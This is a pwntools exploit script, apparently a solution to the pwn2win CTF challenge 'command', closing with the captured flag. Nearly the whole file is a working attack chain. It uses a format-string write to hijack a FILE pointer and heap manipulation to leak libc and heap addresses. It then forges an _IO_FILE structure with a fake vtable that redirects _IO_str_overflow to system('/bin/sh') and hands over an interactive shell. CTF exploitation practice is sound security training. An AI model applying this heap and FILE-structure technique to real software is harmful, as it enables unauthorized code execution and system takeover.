#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./command')
libc = ELF('./libc.so.6')

host = args.HOST or 'command.pwn2.win'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
pie b *0x135F
pie b *0x1507
continue
'''.format(**locals())

# -- Exploit goes here --

def include(priority, command):
    io.sendlineafter(">", "1")
    io.sendlineafter(":", str(priority))
    io.sendafter(":", str(command))

def review(idx, libc=False):
    io.sendlineafter(">", "2")
    io.sendlineafter(":", str(idx))
    io.recvuntil("Priority: ")
    io.recvline()
    if libc: #libc leak
        data = io.recvline()
        leak =(u64(data.split("Command: ")[1].strip().ljust(8, '\x00')))
        log.info(hex(leak))
        return leak
    else: # heap leak
        data = io.recvline()
        data = data.split("Command: DDDDDDDD")[1].strip()

        leak =(u64(data.ljust(8, '\x00')))
        log.info(hex(leak))
        return leak

def delete(idx):
    io.sendlineafter(">", "3") 
    io.sendlineafter(":", str(idx))

def list():
    io.sendlineafter(">", "4")
    io.recvuntil("Priority: 8")
    io.recvline()
    data = io.recvline()
    leak =(u64(data.split("Command: ")[1].strip().ljust(8, '\x00')))
    log.info(hex(leak))
    return leak

def send5(rbs):
    io.sendlineafter(">", "5")
    io.sendlineafter("rbs?", str(rbs))


def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

# Exploit

io = start()
# set stream to user controlled chunk (1) using the padding/* trick to read address at offset rsp+19 and directly write into 4th fmt str argument (FILE ptr)
name = "%*19$c%4$hn\n"

io.sendafter("name: ", name)

# fill tcache and prepare large chunk for libc and heap leak
for i in range(10):
    include(i, cyclic(8, n=8))
for i in range(10):
    delete(9-i)

# fill tcache
for i in range(7):
    include(i, "B")

# leak libc address from arena pointers of large chunk (1 byte overwrite)
pause()
include(7, "C")
leak = review(7, True)
libc.address = leak - 0x3ebf43 - 0x100 # offset to base of libc
log.success("Libc base: " + hex(libc.address))

# heap leak occurs when chunk is inserted into large bin. We can leak fd_nextsize or bk_nextsize
# this happens when the 0x4b0  (>512 bytes) chunk was in unsorted bin and then gets put in a llarge bin before hte 0x190 chunks is fetched from it
# at this point it is put into unsorted bin again. refer to https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/

delete(7)
# overwrite remnant of bk pointer to we can leak heap ptrs 
include(7, "D"*8)
heap = review(7)
log.success("Heap: " + hex(heap))



# https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
# change (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
# to fp->system("/bin/sh")

rip = libc.sym.system
rdi = next(libc.search("/bin/sh"))
# We can only have even rdi
assert(rdi%2 == 0)

log.info("rip:" + hex(rip))
log.info("rdi:" + hex(rdi))


# The chunk we use to put our FILE in is at that offset
chunk = heap+1616

io_str_overflow_ptr_addr = libc.symbols['_IO_file_jumps'] + 0xd8
log.info("overflow ptr: " + hex(io_str_overflow_ptr_addr))

fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)/2,
                        _IO_write_ptr = (rdi-100)/2,
                        _IO_write_base = 0,
                        _lock = chunk + 0x80) # pointer to 0

log.info("lock: "+ hex(chunk + 0x80))

file_struct += p64(fake_vtable_addr)
file_struct += p64(rip)
file_struct = file_struct.ljust(0x100, "\x00")

# free chunk we will write fake FILE into
delete(1)
# the first 8 bytes are passed in the priority, the rest in the command
include(0, file_struct[8:])

# trigger exploit chain
send5(0)

io.interactive()
# CTF-BR{_wh4t_4_fUn_xpl_ch41n_mY_c0mm4nd3r_}
